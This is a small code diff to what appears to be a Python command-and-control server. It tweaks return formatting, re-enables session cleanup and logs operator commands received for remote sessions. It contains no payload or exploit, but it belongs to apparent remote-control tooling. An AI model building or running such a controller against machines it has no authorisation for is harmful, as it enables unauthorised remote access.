@@ -470,7 +470,7 @@ class C2():
 
                 data = conn.recv(1024).decode("utf-8")
                 
-                return [data, conn]
+                return [ data, conn ]
 
             # Get prompt from the users input
             return [ raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip()), None ]
@@ -1264,10 +1264,10 @@ class Session(threading.Thread):
                 print(f"final result task: {task}")
 
             # Exit the session properly
-            # time.sleep(1)
-            # globals()['c2'].session_remove(self.id)
-            # self._active.clear()
-            # globals()['c2']._return()
+            time.sleep(1)
+            globals()['c2'].session_remove(self.id)
+            self._active.clear()
+            globals()['c2']._return()
 
             return
 
@@ -1284,6 +1284,7 @@ class Session(threading.Thread):
                     elif 'prompt' in task.get('task'):
                         self._prompt = task
                         [ command, conn ] = globals()['c2']._get_prompt(task.get('result') % int(self.id))
+                        util.display(f"command in: {command}")
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
